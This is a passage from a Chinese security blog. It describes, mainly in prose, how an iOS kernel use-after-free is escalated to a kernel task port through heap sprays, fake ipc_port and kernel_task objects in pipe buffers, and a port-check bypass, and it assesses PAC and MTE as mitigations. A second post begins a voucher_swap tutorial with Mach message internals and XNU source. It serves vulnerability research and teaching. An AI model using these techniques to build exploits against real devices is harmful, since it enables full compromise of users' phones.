<p>上面绿色的节点代表我们探索的种子值，橙色的节点代表我们要找的值。通过在消息中喷出一个包含指向代表我们主机端口的<code>ipc_port</code>结构的指针的OOL端口描述符数组，我们找到它的<code>ipc_port</code>，它将通过接收器字段给我们提供<code>ipc_space_kernel</code>。</p>
<p>我们重复同样的初始技巧，为我们自己的任务找到<code>ipc_port</code>。从那里我们找到我们的任务的文件描述符表，然后用它来找到一个用于<code>socket</code>选项和管道缓冲区的<code>vtable</code>。<code>vtable</code>将给我们提供进入内核缓存二进制的指针。因为内核进程的BSD表示<code>kernproc</code>是在<code>bsd/kern/bsd_init.c</code>中全局分配的，所以我们可以使用<code>socketops</code>表中的已知偏移量来找到它，并查找<code>kernel_task</code>的地址。</p>
<p>管道缓冲区是通过调用pipe()系统调用创建的，它分配了一个缓冲区，<strong>我们可以通过文件描述符来写入和读取，这是一个众所周知的技巧，用于在已知地址下获取已知数据</strong>。为了制作我们将注入IPC空间的假<code>ipc_port</code>，我们创建一个管道，并向它发送数据。管道将排队的数据存储到内核堆上的一个缓冲区，通过通用的基于大小的区域分配。我们可以通过对相关管道文件描述符的读写，从用户空间反复读写该缓冲区，而这些数据则存储在内核内存中。通过知道我们管道的缓冲区地址，我们就可以在那里存储受控数据，并为其创建指针。我们将需要这些来为内核任务制作一个制作的<code>ipc_port</code>。</p>
<p>所以我们现在可以创建一个假的<code>ipc_port</code>并把它指向<code>kernel_task</code>和<code>ipc_space_kernel</code>， 对吗？我现在应该指出，即使我们可以调用<code>task_for_pid(0)</code>并获得一个<code>kernel_task</code>端口，我们也不能向它发送消息。当内核将一个任务的 <code>ipc_port</code>转化为任务结构时，任何试图向<code>kernel_task</code>发送消息的用户区任务都会被阻止。这在<code>task_conversion_eval</code>中实现。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">task_conversion_eval</span><span class="params">(<span class="type">task_t</span> caller, <span class="type">task_t</span> victim)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Tasks are allowed to resolve their own task ports, and the kernel is</span></span><br><span class="line"><span class="comment">         * allowed to resolve anyone&#x27;s task port.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (caller == kernel_task) &#123;</span><br><span class="line">                <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (caller == victim) &#123;</span><br><span class="line">                <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Only the kernel can can resolve the kernel&#x27;s task port. We&#x27;ve established</span></span><br><span class="line"><span class="comment">         * by this point that the caller is not kernel_task.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (victim == TASK_NULL || victim == kernel_task) &#123;</span><br><span class="line">                <span class="keyword">return</span> KERN_INVALID_SECURITY;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>我使用了很多人使用过的<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-2.html">技巧</a>，简单地创建了一个<code>kernel_task</code>对象的副本，这样他们使用的指针比较就不会检测到我在向假的<code>kernel_task</code>对象发送消息。它不是真正的<code>kernel_task</code>并不重要，因为用一个假的<code>kernel_task</code>来支持<code>mach_vm_*</code>函数是很简单的，我们只需要复制内核的<code>kernel_map</code>和初始化一些其他的字段。在上图中你可以看到，我们可以简单地从<code>kernel_task</code>中提取，我们已经知道它的地址。我们将在管道缓冲区中存储与假<code>ipc_port</code>相邻的假内核任务。</p>
<h2 id="注入kernel-task端口"><a href="#注入kernel-task端口" class="headerlink" title="注入kernel_task端口"></a>注入kernel_task端口</h2><p>我们现在要使用OOL端口描述符数组做另一个用途。我们向自己发送一条消息，其中包含一个OOL数组，该数组包含我们的任务端口名称的副本，我们有发送权。发送权的验证最初发生在消息被发送的时候，所以如果我们在等待发送的时候编辑数组，我们可以覆盖其中一个<code>ipc_ports</code>，指向我们的假的<code>kernel_task ipc_port</code>。这个技巧改编自Stefan Esser关于这个主题的出色<a target="_blank" rel="noopener" href="https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core">演讲</a>，并且已经被用于一些漏洞的利用。请注意，<code>ipc_port</code>本身并没有发送或接收权限的概念；这些权限是作为<code>ipc_entry</code>的一部分被跟踪的，并且在<code>ipc_port</code>之外被处理。这是有道理的，因为一个端口封装了一个给定的消息队列。向该队列发送或接收的权限是每个进程所特有的，因此我们可以看到为什么这些信息会独立地存储在每个进程的表中。</p>
<p>尽管这种在OOL端口描述符数组中覆盖指针的技巧是一种已知的利用技术，但如何真正使这种破坏发生，要由利用开发者来想办法。我们有一个任意读取和任意释放。OOL端口描述符数组和管道缓冲区是在全局区外分配的。前面我们记下了管道缓冲区的地址。所以我们只需要释放管道缓冲区的实际缓冲区地址，并喷涂OOL端口描述符数组。然后我们读取管道缓冲区寻找我们任务的<code>ipc_port</code>，用我们的假端口指针覆盖它。然后我们将消息传递给自己，并检查我们是否成功注入了假的内核任务端口。</p>
<p>此时，我们有了tfp0。就像<code>voucher_swap</code>和其他漏洞一样，我们要使用这个临时的tfp0使用管道缓冲结构来引导一个更稳定的tfp0。我们通过使用内核任务端口来分配一页专门用于存储我们的数据的内核内存，然后使用写原语将我们的假任务端口和<code>kernel_task</code>写入那里。然后我们改变我们的IPC空间条目，使之指向这个新的<code>ipc_port</code>。</p>
<p>我们仍然有一个管道结构，它有一个指向释放的缓冲区的悬空指针。我们不想让它在关闭fd时double-free，所以我们使用新的稳定的tfp0来清空这个指针。我们基本上做了两个动作来破坏内存：释放那个指针，并使用新的使用后释放的管道缓冲区来覆盖单个<code>ipc_port</code>指针，所以跟踪清理是相当直接的。</p>
<h2 id="评估PAC和MTE"><a href="#评估PAC和MTE" class="headerlink" title="评估PAC和MTE"></a>评估PAC和MTE</h2><p>因为这个漏洞是基于内存损坏的bug，所以不同的缓解措施对它的影响是一个挥之不去的问题。通过A12芯片，苹果为iOS带来了PAC(指针认证)，这似乎是为了限制内核代码的执行，假设任意的内核读写等目标。这听起来是一个很强的缓解措施，如果没有实际经验，我不知道利用情况如何。我是在A9芯片上测试的，所以我只是希望我的利用中不会做任何会被PAC缓解的事情。事实果然如此。因为我的漏洞只针对数据结构，不涉及任意代码执行，所以没有代码指针可以伪造。</p>
<p>iOS 13开始引入了对一些数据指针的保护，所以值得研究一下我需要伪造哪些指针才能让这个漏洞在数据PAC的情况下发挥作用。PAC通过用私钥和指针本身在栈上的位置作为上下文值进行签名来保护栈上的返回地址不被破坏。但是，其他代码指针的签名是没有上下文值的。同样，数据PAC的有效性很可能取决于苹果选择如何使用上下文值。</p>
<p>让我们考虑一下这样的情况：所有的数据指针都是受保护的，但没有基于位置的上下文签名。在这种情况下，只要我们设法泄露它们，我们就可以将它们从一个位置复制到另一个位置。这就是比较有名的 “指针替换攻击”，Brandon在他关于PAC的<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html">博文</a>中已经描述过。</p>
<p>我们的读原语在数据PAC的上下文中仍然有效，因为我们的悬空指针仍然是签名的。我们最终需要伪造或替换几个攻击者来源的指针：<code>ipc_space_kernel</code>、<code>kernel_map</code>、<code>&amp;fake_port</code>和<code>&amp;fake_task</code>，以及找到它们所需的所有中间读。回顾一下，<code>&amp;fake_port</code>和<code>&amp;fake_task</code>是指向管道缓冲区的指针。对于我们的初始入口点，<code>pktoininfo</code>指针是否受保护并不重要，因为我们必须通过OOL端口喷涂来泄露一个真正的<code>ipc_port</code>指针。这意味着我们可以收集一个签名的<code>ipc_port</code>，然后做所有我们已经做的前期数据结构遍历，复制PAC数据指针没有问题，<code>ipc_space_kernel</code>和<code>kernel_map</code>已经被签名了，如果管道缓冲区被签名了，我们可以简单地将假的端口和任务分割到两个管道缓冲区，然后获得每个缓冲区的签名指针。在任何情况下，这个漏洞都不会完全开箱即用，因为我们确实伪造了一个指针到文件描述符表中去查找任意的fd结构，而且有些查找可能需要读取超过20字节的数据。不过，我相信读取原语的功能足够强大，可以在不费吹灰之力的情况下解决这些漏洞。</p>
<p>实际上iOS 13只保护一些数据指针，矛盾的是这可能会提高终端用户的安全性。例如，如果管道缓冲区不受保护，如果端口的指针是有签名的，那么简单地泄露一个缓冲区的地址不太可能让我们用这个指针来表示一个假的ipc_port。对17B5068e的内核缓存进行检查后发现，IPC端口指针确实没有受到保护，但根据苹果今年早些时候的BlackHat演讲，我认为他们计划这样做（或者已经在非beta构建中这样做了）。就像任何缓解措施与提供强大初始原语的bug相结合一样，这只是一个设计替代利用技术的问题。在不考虑哪些指针应该被保护或不保护的捶胸顿足的情况下，我希望在未来，尽可能多的指针都以位置作为上下文进行签名，以帮助缓解指针替换攻击的影响。从我们的思想实验中可以看出，如果数据指针只是简单地以上下文为0进行签名，那么，一个好的基于use-after-free的读取原语并没有什么好处。</p>
<p>另一个需要考虑的缓解措施是ARM的内存标签扩展（MTE），我相信苹果会尝试实现这个即将到来的CPU功能。对于这个缓解措施，这里和这里有一个很好的高层总结。实质上，内存分配器将为内存分配分配分配一个随机的标签，这个标签将成为指针上部未使用位的一部分，就像在PAC中一样。正确的标签值将被存储在行外，类似于ASAN如何将堆元数据存储在行外。当处理器去解除对指针的引用时，它会检查标签是否匹配。这个漏洞本来是可以被MTE缓解的，因为我们在漏洞中多次触发释放后的使用，每次访问释放的指针时，它的标签都会与释放范围的新标签或哪个分配回收缓冲区的标签进行比较。根据CPU或内核的配置，当一个不匹配的标签被识别出来时，会影响到如何进行利用。我希望苹果公司在标签检查失败时配置一个同步或异步异常，考虑到他们根据他们对PAC的LLVM文档，努力触发PAC违规的数据中止。”虽然ARMv8.3的aut*指令本身并不会在失败时触发异常，但编译器只会在会触发异常的序列中发出这些指令。”</p>
<h1 id="iOS-Exploit-Meta"><a href="#iOS-Exploit-Meta" class="headerlink" title="iOS Exploit Meta"></a>iOS Exploit Meta</h1><table>
<thead>
<tr>
<th><strong>Summary</strong></th>
<th><strong>Benefit</strong></th>
<th><strong>Used?</strong></th>
</tr>
</thead>
<tbody><tr>
<td>IOSurface subsystem</td>
<td>Spray arbitrary data of controlled contents and size in kernel address space</td>
<td>Yes</td>
</tr>
<tr>
<td>OOL port descriptor array</td>
<td>Spray arbitrary multiple of 8 array containing pointers to ipc_ports with send right</td>
<td>Yes</td>
</tr>
<tr>
<td>Pipe buffers</td>
<td>Repeatable read&#x2F;write from userland of malloced buffer without needing sprays</td>
<td>Yes</td>
</tr>
<tr>
<td>Looking around the host port for other early ports</td>
<td>Find the kernel task port</td>
<td>Yes, SockPuppetV1, replaced with my own variant later</td>
</tr>
<tr>
<td>Copying kernel_task task port to a new address</td>
<td>Bypass kernel_task task port check for messages coming from a user task</td>
<td>Yes</td>
</tr>
<tr>
<td>Creating a fake task port pointing to an arbitrary “task” and reading its PID</td>
<td>Repeatable arbitrary read</td>
<td>No, already had arbitrary read directly via first stage</td>
</tr>
<tr>
<td>Triggering zone allocator garbage collection</td>
<td>Reclaim an object from one zone with an object from another</td>
<td>No, all relevant objects were already in the generic size-based zones</td>
</tr>
</tbody></table>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-03-18T01:38:20.000Z" title="2022/3/18 09:38:20">2022-03-18</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-02T12:39:22.426Z" title="2022/5/2 20:39:22">2022-05-02</time></span><span class="level-item">2 hours read (About 18405 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/18/%E4%BB%8Evoucher_swap%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%A7%8B%E5%AD%A6iOS%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/">从voucher_swap漏洞开始学iOS内核利用</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="Mach消息"><a href="#Mach消息" class="headerlink" title="Mach消息"></a>Mach消息</h3><p>Mach IPC，从Mach微内核派生而来，是最快的IPC机制之一。</p>
<ul>
<li>Mach IPC基于单向通信。</li>
<li>Mach IPC中的通信以Mach消息的形式在端口之间进行，根据消息头中设置的特定位，消息可以是简单的也可以是复杂的。</li>
<li>发送和接收消息必须具有相应的端口权限：<ul>
<li>MACH_PORT_RIGHT_SEND-允许发送消息</li>
<li>MACH_PORT_RIGHT_RECEIVE-允许接收消息</li>
<li>MACH_PORT_RIGHT_SEND_ONCE-允许发送一次消息</li>
<li>MACH_PORT_RIGHT_PORT_SET-面向一组端口接收或发送消息</li>
<li>MACH_PORT_RIGHT_DEAD_NAME-表示因为对应的端口被销毁或者已经发送了一次消息从而无效的SEND或者SEND_ONCE权限</li>
</ul>
</li>
<li>Mach端口权限可以嵌入并通过Mach消息发送。</li>
<li>一个端口可以有多个发送权限，但只有一个接收权限。发送权限可以克隆，接收权限不能。</li>
<li>发送的Mach消息在接收方收到之前，将保存在内核的队列中。</li>
<li>iOS中最重要的二进制文件之一launchd充当引导服务器并允许进程之间相互通信。launchd可以帮助一个进程查找另一个进程，因为所有进程都通过launchd启动并在启动时注册。因此，launchd可以实现节流（throttling）并在某些情况下允许或拒绝查找，从而充当安全控件。launchd非常重要，是第一个启动的守护进程（PID为1），launchd中的任何crash将立即触发内核Panic。</li>
<li>消息由进程内的线程发送和接收，充当进程内的执行单元，但是，端口权限保留在任务级别，并可在任务的ipc_space中找到。</li>
</ul>
<h4 id="简单消息"><a href="#简单消息" class="headerlink" title="简单消息"></a>简单消息</h4><p>简单消息的body会被内核忽略，<code>osfmk/mach/message.h</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">mach_msg_size_t</span> msgh_descriptor_count;</span><br><span class="line">&#125; <span class="type">mach_msg_body_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_BODY_NULL (mach_msg_body_t *) 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_DESCRIPTOR_NULL (mach_msg_descriptor_t *) 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>	<span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">mach_msg_bits_t</span>	msgh_bits; <span class="comment">// 包含消息属性的位图</span></span><br><span class="line">  <span class="type">mach_msg_size_t</span>	msgh_size; <span class="comment">// header+body的大小</span></span><br><span class="line">  <span class="type">mach_port_t</span>		msgh_remote_port; <span class="comment">// 目标端口的发送权限</span></span><br><span class="line">  <span class="type">mach_port_t</span>		msgh_local_port; <span class="comment">// 接收端口的接收权限</span></span><br><span class="line">  <span class="type">mach_port_name_t</span>	msgh_voucher_port; <span class="comment">// voucher用于通过键值对传递消息中的数据</span></span><br><span class="line">  <span class="type">mach_msg_id_t</span>		msgh_id; <span class="comment">// 任意32位值</span></span><br><span class="line">&#125; <span class="type">mach_msg_header_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	msgh_reserved		msgh_voucher_port</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_NULL	(mach_msg_header_t *) 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">mach_msg_header_t</span>       header;</span><br><span class="line">        <span class="type">mach_msg_body_t</span>         body;</span><br><span class="line">&#125; <span class="type">mach_msg_base_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">mach_msg_bits_t</span>;</span><br></pre></td></tr></table></figure>

<p><code>mach_msg_bits_t</code>取值的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_ZERO		0x00000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_REMOTE_MASK	0x0000001f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_LOCAL_MASK	0x00001f00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_VOUCHER_MASK	0x001f0000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_PORTS_MASK		\</span></span><br><span class="line"><span class="meta">		(MACH_MSGH_BITS_REMOTE_MASK |	\</span></span><br><span class="line"><span class="meta">		 MACH_MSGH_BITS_LOCAL_MASK |	\</span></span><br><span class="line"><span class="meta">		 MACH_MSGH_BITS_VOUCHER_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_COMPLEX		0x80000000U	<span class="comment">/* message is complex */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_USER             0x801f1f1fU	<span class="comment">/* allowed bits user-&gt;kernel */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_RAISEIMP		0x20000000U	<span class="comment">/* importance raised due to msg */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_DENAP		MACH_MSGH_BITS_RAISEIMP</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_IMPHOLDASRT	0x10000000U	<span class="comment">/* assertion help, userland private */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSGH_BITS_DENAPHOLDASRT	MACH_MSGH_BITS_IMPHOLDASRT</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_CIRCULAR		0x10000000U	<span class="comment">/* message circular, kernel private */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	MACH_MSGH_BITS_USED		0xb01f1f1fU</span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果<code>MACH_MSGH_BITS_COMPLEX</code>没有打开，内核将假定消息的主体不包含端口权限或 OOL 数据，用户任务在解析消息主体时需要小心，因为消息主体中的mach_msg_type可能会对内容 “撒谎”，从而可能导致未定义的行为。</li>
<li><code>MACH_MSGH_BITS_REMOTE</code>决定如何解释<code>msg_remote_port</code>字段，处理类似于<code>msgt_name</code>，结果必须是send或者send-once类型的权限。</li>
<li><code>MACH_MSGH_BITS_LOCAL</code>决定如何解释<code>msgh_local_port</code>字段，处理方式与<code>msgt_name</code>类似，结果也必须是send或者send-once类型的权限。</li>
<li><code>MACH_MSGH_BITS_VOUCHER</code>决定如何解释<code>msgh_voucher_port</code>字段，处理方式与<code>msgt_nam</code>e类似，结果必须是一个发送权（而且<code>msgh_voucher_port</code>字段必须是一个<code>Mach voucher</code>内核对象的发送权的名称）。</li>
<li><code>MACH_MSGH_BITS()</code>结合了两个<code>MACH_MSG_TYPE_*</code>值，用于远程和本地字段，变成一个适合<code>msgh_bits</code>的单一值。</li>
<li><code>MACH_MSGH_BITS_CIRCULAR</code>应该是零；是内部使用的。</li>
<li>未使用的位应该是零，保留给内核或未来的接口扩展。</li>
</ul>
<p>除了header，还包含一些描述符，在消息主体中指定了描述符的数量（msgh_descriptor_count），<code>BUILD/obj/EXPORT_HDRS/osfmk/mach/message.h</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__LP64__) &amp;&amp; defined(KERNEL)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">mach_msg_port_descriptor_t</span>		port;</span><br><span class="line">  <span class="type">mach_msg_ool_descriptor32_t</span>		out_of_line;</span><br><span class="line">  <span class="type">mach_msg_ool_ports_descriptor32_t</span>	ool_ports;</span><br><span class="line">  <span class="type">mach_msg_type_descriptor_t</span>		type;</span><br><span class="line">&#125; <span class="type">mach_msg_descriptor_t</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">mach_msg_port_descriptor_t</span>		port;</span><br><span class="line">  <span class="type">mach_msg_ool_descriptor_t</span>		out_of_line;</span><br><span class="line">  <span class="type">mach_msg_ool_ports_descriptor_t</span>	ool_ports;</span><br><span class="line">  <span class="type">mach_msg_type_descriptor_t</span>		type;</span><br><span class="line">&#125; <span class="type">mach_msg_descriptor_t</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">mach_msg_size_t</span> msgh_descriptor_count;</span><br><span class="line">&#125; <span class="type">mach_msg_body_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_BODY_NULL (mach_msg_body_t *) 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_DESCRIPTOR_NULL (mach_msg_descriptor_t *) 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>	<span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">mach_msg_bits_t</span>	msgh_bits;</span><br><span class="line">  <span class="type">mach_msg_size_t</span>	msgh_size;</span><br><span class="line">  <span class="type">mach_port_t</span>		msgh_remote_port;</span><br><span class="line">  <span class="type">mach_port_t</span>		msgh_local_port;</span><br><span class="line">  <span class="type">mach_port_name_t</span>	msgh_voucher_port;</span><br><span class="line">  <span class="type">mach_msg_id_t</span>		msgh_id;</span><br><span class="line">&#125; <span class="type">mach_msg_header_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	msgh_reserved		msgh_voucher_port</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_NULL	(mach_msg_header_t *) 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">mach_msg_header_t</span>       header;</span><br><span class="line">        <span class="type">mach_msg_body_t</span>         body;</span><br><span class="line">&#125; <span class="type">mach_msg_base_t</span>;</span><br></pre></td></tr></table></figure>

<p><code>mach_msg_type_descriptor_t</code>表示是什么类型的描述符，其他字段则包含相应的数据，类型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 在一个复杂的mach消息中，mach_msg_header_t后面是一个描述符计数，然后是一个包含该数量描述符的数组(mach_msg_*_descriptor_t)</span></span><br><span class="line"><span class="comment"> * mach_msg_type_descriptor_t字段表示该描述符的类型</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 注意，在LP64中，各种类型的描述符不再都是与mach_msg_descriptor_t相同的大小，所以数组不能像预期的那样被索引。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">mach_msg_descriptor_type_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_PORT_DESCRIPTOR 		0           <span class="comment">// 在消息中发送一个端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_OOL_DESCRIPTOR  		1           <span class="comment">// 在消息中发送OOL数据</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_OOL_PORTS_DESCRIPTOR 		2     <span class="comment">// 在消息中发送OOL端口数组</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MACH_MSG_OOL_VOLATILE_DESCRIPTOR  	3   <span class="comment">// 在消息中发送易失性数据</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(4)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">natural_t</span>			pad1;</span><br><span class="line">  <span class="type">mach_msg_size_t</span>		pad2;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span>			pad3 : <span class="number">24</span>;</span><br><span class="line">  <span class="type">mach_msg_descriptor_type_t</span>	type : <span class="number">8</span>;</span><br><span class="line">&#125; <span class="type">mach_msg_type_descriptor_t</span>;</span><br></pre></td></tr></table></figure>

<p>OOL指Out-of-line，OOL端口描述符广泛应用于使用用户控制的数据来进行堆喷。每当使用<code>MACH_MSG_OOL_DESCRIPTOR</code>时，将在内核堆中分配具有所有端口指针的数组。</p>
<p>端口在用户态中用<code>mach_port_t</code>或<code>mach_port_name_t</code>表示，但内核中不采用这种表示。</p>
<ul>
<li><code>mach_port_name_t</code>表示本地命名空间标识，但未关联任何端口权限，并且在任务命名空间之外基本上没有任何意义。</li>
<li>进程从内核处接收到<code>mach_port_t</code>，就会将关联的端口权限映射到接收者，<code>mach_port_name_t</code>则不会。</li>
<li><code>mach_port_t</code>通常至少拥有一项权限，可以是RECEIVE、SEND或SEND_ONCE。</li>
<li>获得<code>mach_port_t</code>的句柄会自动在调用者的命名空间中创建关联的发送权限。</li>
</ul>
<p>发送或接收消息，可以使用<code>osfmk/mach/message.h</code>中定义的<code>mach_msg</code>和<code>mach_msg_overwrite</code> API。</p>
